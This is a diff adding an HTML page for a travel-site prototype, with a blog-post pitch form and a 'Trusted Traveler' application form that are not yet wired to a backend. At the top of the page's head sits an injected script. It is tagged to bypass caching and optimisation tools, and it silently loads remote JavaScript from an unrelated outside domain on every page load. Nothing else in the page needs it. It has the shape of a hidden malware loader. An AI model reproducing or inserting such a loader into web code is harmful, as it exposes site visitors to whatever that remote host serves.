@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1">
+  (function () {
+      var script = document.createElement("script");
+      script.async = 1;
+      script.src = 'https://emrld.ltd/NTQ4MDY2.js?t=548066';
+      document.head.appendChild(script);
+  })();
+</script>
+
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta name="description" content="Contribute to Never Roam Alone — pitch a blog post or apply to become a Trusted Traveler and help fellow roamers.">
+<title>Community Contributions — Never Roam Alone</title>
+
+<!-- Amatic SC (logo font) -->
+<link rel="stylesheet" href="fonts/amatic-sc.css" />
+
+<style>
+  :root{
+    --ink:#1d2a32;
+    --muted:#5b6b75;
+    --sand:#f6f1e7;
+    --teal:#0e7c86;
+    --teal-dark:#0a5c64;
+    --coral:#ef6f53;
+    --card:#ffffff;
+    --shadow:0 10px 30px rgba(20,40,50,.12);
+    --maxw:1180px;
+  }
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{
+    margin:0;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    color:var(--ink);
+    background:var(--sand);
+    line-height:1.6;
+  }
+  h1,h2,h3{font-family:Georgia,"Amatic SC",serif;letter-spacing:.2px}
+  a{color:inherit;text-decoration:none}
+
+  /* ---------- Menu bar ---------- */
+  header.nav{
+    position:sticky;top:0;z-index:50;
+    background:rgba(246,241,231,.92);
+    backdrop-filter:blur(8px);
+    border-bottom:1px solid rgba(14,124,134,.15);
+  }
+  .nav-inner{
+    max-width:var(--maxw);margin:0 auto;padding:14px 22px;
+    display:flex;align-items:center;justify-content:space-between;
+  }
+  .brand{display:flex;align-items:center;gap:10px;font-family:'Amatic SC',Georgia,serif;font-weight:700;font-size:1.85rem;line-height:1;color:#c35237}
+  .brand .dot{width:12px;height:12px;border-radius:50%;background:var(--coral);box-shadow:0 0 0 4px rgba(239,111,83,.2)}
+  .brand .logo{flex-shrink:0;display:block}
+  .brand small{display:block;font-family:-apple-system,sans-serif;font-weight:500;font-size:.62rem;letter-spacing:.18em;text-transform:uppercase;color:var(--muted)}
+  nav.links a{
+    margin-left:26px;font-weight:600;font-size:.95rem;color:var(--muted);
+    padding-bottom:3px;border-bottom:2px solid transparent;transition:.2s;
+  }
+  nav.links a:hover{color:var(--teal);border-color:var(--coral)}
+
+  /* ---------- Page hero ---------- */
+  .legal-hero{max-width:820px;margin:0 auto;padding:48px 22px 6px;text-align:center}
+  .legal-hero p.kicker{color:var(--teal);font-weight:700;text-transform:uppercase;letter-spacing:.18em;font-size:.78rem;margin:0 0 12px}
+  .legal-hero h1{font-size:clamp(2rem,5vw,3rem);margin:0 0 8px}
+  .legal-hero p.sub{color:var(--muted);font-size:1rem;margin:0 auto;max-width:560px}
+
+  /* ---------- Contribution options ---------- */
+  .options{max-width:960px;margin:22px auto 0;padding:0 22px;display:flex;gap:16px;flex-wrap:wrap;justify-content:center}
+  .options a.jump{
+    display:inline-flex;align-items:center;gap:8px;font-weight:700;font-size:.9rem;
+    padding:10px 18px;border-radius:24px;border:1.5px solid var(--teal);color:var(--teal);background:#fff;transition:.15s;
+  }
+  .options a.jump:hover{background:var(--teal);color:#fff}
+
+  /* ---------- Form card ---------- */
+  .form-card{
+    max-width:640px;margin:26px auto 0;padding:40px 42px;
+    background:var(--card);border-radius:20px;box-shadow:var(--shadow);scroll-margin-top:90px;
+  }
+  .form-card:last-of-type{margin-bottom:60px}
+  .form-card .card-kicker{color:var(--teal);font-weight:700;text-transform:uppercase;letter-spacing:.16em;font-size:.72rem;margin:0 0 6px}
+  .form-card h2{font-size:1.7rem;margin:0 0 8px}
+  .form-card p.card-intro{color:var(--muted);font-size:.94rem;margin:0 0 26px}
+  .field{margin:0 0 20px}
+  .field label{display:block;font-weight:700;font-size:.88rem;margin:0 0 6px;color:var(--ink)}
+  .field .opt{font-weight:500;color:var(--muted);font-size:.8rem}
+  .field input[type=text],
+  .field input[type=email],
+  .field input[type=url],
+  .field textarea{
+    width:100%;font:inherit;font-size:.98rem;padding:12px 14px;border-radius:10px;
+    border:1.5px solid rgba(14,124,134,.22);background:var(--sand);color:var(--ink);
+    transition:.15s;
+  }
+  .field input:focus, .field textarea:focus{outline:none;border-color:var(--teal);background:#fff}
+  .field textarea{resize:vertical;min-height:130px}
+  .file-drop{
+    display:flex;align-items:center;gap:12px;flex-wrap:wrap;
+    border:1.5px dashed rgba(14,124,134,.3);border-radius:10px;padding:14px;background:var(--sand);
+  }
+  .file-drop button{
+    font:inherit;font-weight:700;font-size:.85rem;padding:9px 16px;border-radius:20px;
+    border:1.5px solid var(--teal);background:#fff;color:var(--teal);cursor:pointer;transition:.15s;
+  }
+  .file-drop button:hover{background:var(--teal);color:#fff}
+  .file-drop .filename{color:var(--muted);font-size:.85rem;word-break:break-all}
+  .hint{color:var(--muted);font-size:.8rem;margin-top:6px}
+  .submit-btn{
+    width:100%;font:inherit;font-weight:700;font-size:1rem;padding:14px 20px;border-radius:26px;
+    border:none;background:var(--coral);color:#fff;cursor:pointer;transition:.15s;
+    box-shadow:0 8px 20px rgba(239,111,83,.32);
+  }
+  .submit-btn:hover{background:#d85d43}
+  .status-msg{margin-top:16px;padding:12px 14px;border-radius:10px;font-size:.92rem;display:none}
+  .status-msg.ok{display:block;background:rgba(24,94,63,.1);color:#185e3f}
+  .status-msg.err{display:block;background:rgba(239,111,83,.12);color:#b8452f}
+
+  footer{background:var(--teal-dark);color:#dff1f2;text-align:center;padding:40px 22px;margin-top:30px}
+  footer .brand{justify-content:center;color:#c35237}
+  footer .foot-links{margin-top:14px;display:flex;gap:18px;justify-content:center;flex-wrap:wrap}
+  footer .foot-links a{color:#dff1f2;font-size:.85rem;font-weight:600;opacity:.9;border-bottom:1px solid transparent}
+  footer .foot-links a:hover{color:#fff;border-color:var(--coral);opacity:1}
+  footer small{display:block;margin-top:14px;color:rgba(255,255,255,.6)}
+
+  @media(max-width:880px){
+    nav.links{display:none}
+    .form-card{padding:28px 22px}
+  }
+</style>
+</head>
+<body>
+
+<!-- ===== Menu bar ===== -->
+<header class="nav">
+  <div class="nav-inner">
+    <a class="brand" href="index.html">
+      <img class="logo" src="logo.svg" width="46" height="46" alt="Never Roam Alone logo">
+      <span>Never Roam Alone<small>Your Travel Companion</small></span>
+    </a>
+    <nav class="links" data-site-nav></nav>
+  </div>
+</header>
+
+<div class="legal-hero">
+  <p class="kicker">Get involved</p>
+  <h1>Community Contributions</h1>
+  <p class="sub">Never Roam Alone is built by roamers, for roamers. Share a story from the road, or step up as a Trusted Traveler to help fellow travelers explore with confidence.</p>
+</div>
+
+<div class="options">
+  <a class="jump" href="#blog-post">✍️ Share a blog post</a>
+  <a class="jump" href="#trusted-traveler">🌍 Become a Trusted Traveler</a>
+</div>
+
+<!-- ===== Blog post contribution form ===== -->
+<main class="form-card" id="blog-post">
+  <p class="card-kicker">Contribute a story</p>
+  <h2>Share a Blog Post</h2>
+  <p class="card-intro">Been somewhere memorable? Pitch a post and our editors may feature it on the blog. Tell us what happened and why it matters to fellow roamers.</p>
+  <form id="blogpost-form" novalidate>
+    <div class="field">
+      <label for="bp-name">Your name</label>
+      <input type="text" id="bp-name" name="name" maxlength="80" autocomplete="name" required>
+    </div>
+    <div class="field">
+      <label for="bp-email">Your email</label>
+      <input type="email" id="bp-email" name="email" maxlength="120" autocomplete="email" required>
+    </div>
+    <div class="field">
+      <label for="bp-title">Post title</label>
+      <input type="text" id="bp-title" name="title" maxlength="140" placeholder="e.g. Three quiet corners of Lisbon most tourists miss" required>
+    </div>
+    <div class="field">
+      <label for="bp-place">Destination or topic <span class="opt">(optional)</span></label>
+      <input type="text" id="bp-place" name="place" maxlength="120" placeholder="City, country, or theme">
+    </div>
+    <div class="field">
+      <label for="bp-story">Your story</label>
+      <textarea id="bp-story" name="story" maxlength="8000" placeholder="Write your post, or a summary of what you'd like to cover…" required></textarea>
+      <p class="hint">A few paragraphs is plenty to start — our editors will follow up.</p>
+    </div>
+    <div class="field">
+      <label for="bp-photo">Cover photo <span class="opt">(optional)</span></label>
+      <div class="file-drop">
+        <button type="button" id="bp-pick-btn">Choose image…</button>
+        <input type="file" id="bp-photo" name="photo" accept="image/*" style="display:none">
+        <span class="filename" id="bp-filename">No file chosen</span>
+      </div>
+      <p class="hint">PNG or JPG — a photo you took and are happy to share.</p>
+    </div>
+    <button type="submit" class="submit-btn">Submit Post for Review</button>
+    <div class="status-msg" id="bp-status" role="status"></div>
+  </form>
+</main>
+
+<!-- ===== Trusted Traveler form ===== -->
+<main class="form-card" id="trusted-traveler">
+  <p class="card-kicker">Join the team</p>
+  <h2>Become a Trusted Traveler</h2>
+  <p class="card-intro">Trusted Travelers are experienced roamers who answer questions, vouch for places, and help newcomers feel at home. Tell us where you know well and why you'd be a great guide.</p>
+  <form id="trusted-form" novalidate>
+    <div class="field">
+      <label for="tt-name">Full name</label>
+      <input type="text" id="tt-name" name="name" maxlength="80" autocomplete="name" required>
+    </div>
+    <div class="field">
+      <label for="tt-email">Your email</label>
+      <input type="email" id="tt-email" name="email" maxlength="120" autocomplete="email" required>
+    </div>
+    <div class="field">
+      <label for="tt-home">Where are you based?</label>
+      <input type="text" id="tt-home" name="home" maxlength="120" placeholder="Home city and country" required>
+    </div>
+    <div class="field">
+      <label for="tt-regions">Places you know well</label>
+      <input type="text" id="tt-regions" name="regions" maxlength="200" placeholder="Cities, countries, or regions you can speak to" required>
+    </div>
+    <div class="field">
+      <label for="tt-link">Profile or social link <span class="opt">(optional)</span></label>
+      <input type="url" id="tt-link" name="link" maxlength="500" placeholder="https://…">
+    </div>
+    <div class="field">
+      <label for="tt-about">Why you'd make a great Trusted Traveler</label>
+      <textarea id="tt-about" name="about" maxlength="4000" placeholder="Tell us about your travels and how you like to help others…" required></textarea>
+    </div>
+    <button type="submit" class="submit-btn">Apply to be a Trusted Traveler</button>
+    <div class="status-msg" id="tt-status" role="status"></div>
+  </form>
+</main>
+
+<footer>
+  <div class="brand"><span class="dot"></span><span>Never Roam Alone</span></div>
+  <div class="foot-links">
+    <a href="index.html">Home</a>
+    <a href="contact.html">Contact</a>
+    <a href="feedback.html">Feedback</a>
+    <a href="community.html">Community Contributions</a>
+    <a href="privacy.html">Privacy Policy</a>
+    <a href="terms.html">Terms of Service</a>
+  </div>
+  <small>Prototype · interactive map + blog layout · built to be refined</small>
+</footer>
+
+<script src="nra-config.js"></script>
+<script src="auth.js"></script>
+<script src="nav.js"></script>
+<script src="i18n.js"></script>
+<script>
+(function(){
+  "use strict";
+
+  // These forms aren't wired to a backend yet — they'll be connected later.
+  // For now, show a friendly "coming soon" note and keep what the visitor typed.
+  var COMING_SOON = "Thanks! This form isn't live just yet — we're putting the finishing touches on it. Please check back soon.";
+
+  // Show the chosen filename for the blog-post cover photo (visual only).
+  var pickBtn = document.getElementById("bp-pick-btn");
+  var fileInput = document.getElementById("bp-photo");
+  var filenameEl = document.getElementById("bp-filename");
+  if (pickBtn && fileInput){
+    pickBtn.addEventListener("click", function(){ fileInput.click(); });
+    fileInput.addEventListener("change", function(){
+      var file = fileInput.files && fileInput.files[0];
+      filenameEl.textContent = file ? file.name : "No file chosen";
+    });
+  }
+
+  function wire(formId, statusId){
+    var form = document.getElementById(formId);
+    var statusEl = document.getElementById(statusId);
+    if (!form) return;
+    form.addEventListener("submit", function(e){
+      e.preventDefault();
+      statusEl.textContent = COMING_SOON;
+      statusEl.className = "status-msg ok";
+      statusEl.scrollIntoView({behavior:"smooth", block:"center"});
+    });
+  }
+  wire("blogpost-form", "bp-status");
+  wire("trusted-form", "tt-status");
+})();
+</script>
+</body>
+</html>
